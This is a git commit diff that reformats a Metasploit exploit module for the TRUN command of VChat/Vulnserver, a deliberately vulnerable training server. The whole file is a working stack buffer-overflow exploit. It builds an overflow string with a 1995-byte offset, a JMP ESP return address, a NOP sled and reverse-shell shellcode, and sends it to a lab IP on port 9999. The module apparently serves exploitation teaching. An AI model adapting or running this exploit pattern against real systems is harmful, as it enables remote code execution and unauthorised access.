ce006d4e89e0c7729d88e307a1c17e46d1d7145e
Matthew Harper <matthew_a_harper@proton.me>
2024-08-23 15:19:30 -0400

    Update MS Comments and Paths

--- Metasploit/TRUN.rb
+++ Metasploit/TRUN.rb
@@ -4,68 +4,68 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-# File path: .msf4/modules/exploits/windows/vulnserver/knock.rb
+# File path: /usr/share/metasploit-framework/modules/exploit/windows/VChat/TRUN.rb
 ##
 # This module exploits the TRUN command of vulnerable chat server
 ##
 
 class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
-    Rank = NormalRanking	# Potential impact to the target
-  
-    include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
-  
-    def initialize(info = {})	# i.e. constructor, setting the initial values
-      super(update_info(info,
-        'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',	# Name of the target
-        'Description'    => %q{	# Explaining what the module does
-           This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
-        },
-        'Author'         => [ 'fxw' ],	## Hacker name
-        'License'        => MSF_LICENSE,
-        'References'     =>	# References for the vulnerability or exploit
-          [
-            #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
-            [ 'URL', 'https://github.com/DaintyJet/VChat_TRUN' ]
+  Rank = NormalRanking	# Potential impact to the target
 
-          ],
-        'Privileged'     => false,
-        'DefaultOptions' =>
-          {
-            'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
-          },      
-        'Payload'        =>	# How to encode and generate the payload
-          {
-            'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
-          },
-        'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
-        'Targets'        =>	#  targets for many exploits
+  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
+
+  def initialize(info = {})	# i.e. constructor, setting the initial values
+    super(update_info(info,
+      'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',	# Name of the target
+      'Description'    => %q{	# Explaining what the module does
+         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
+      },
+      'Author'         => [ 'fxw' ],	## Hacker name
+      'License'        => MSF_LICENSE,
+      'References'     =>	# References for the vulnerability or exploit
         [
-          [ 'EssFuncDLL-JMPESP',
-            {
-              'jmpesp' => 0x62501023 # This will be available in [target['jmpesp']]
-            }
-          ]
-        ],
-        'DefaultTarget'  => 0,
-        'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
-        register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
-            [
-            OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 1995]),
-            Opt::RPORT(9999),
-            Opt::RHOSTS('192.168.7.191')
-        ])
-    end
-  
-    def exploit	# Actual exploit
-      print_status("Connecting to target...")
-      connect	# Connect to the target
+          #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
+          [ 'URL', 'https://github.com/DaintyJet/VChat_TRUN' ]
 
-      shellcode = payload.encoded	# Generated and encoded shellcode
-      outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['jmpesp']].pack('V') + "\x90" * 32 + shellcode # Create the malicious string that will be sent to the target
-  
-      print_status("Sending Exploit")
-      sock.put(outbound)	# Send the attacking payload
-  
-      disconnect	# disconnect the connection
-    end
+        ],
+      'Privileged'     => false,
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
+        },      
+      'Payload'        =>	# How to encode and generate the payload
+        {
+          'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
+        },
+      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
+      'Targets'        =>	#  targets for many exploits
+      [
+        [ 'EssFuncDLL-JMPESP',
+          {
+            'jmpesp' => 0x62501023 # This will be available in [target['jmpesp']]
+          }
+        ]
+      ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
+      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
+          [
+          OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 1995]),
+          Opt::RPORT(9999),
+          Opt::RHOSTS('192.168.7.191')
+      ])
   end
+
+  def exploit	# Actual exploit
+    print_status("Connecting to target...")
+    connect	# Connect to the target
+
+    shellcode = payload.encoded	# Generated and encoded shellcode
+    outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['jmpesp']].pack('V') + "\x90" * 32 + shellcode # Create the malicious string that will be sent to the target
+
+    print_status("Sending Exploit")
+    sock.put(outbound)	# Send the attacking payload
+
+    disconnect	# disconnect the connection
+  end
+end
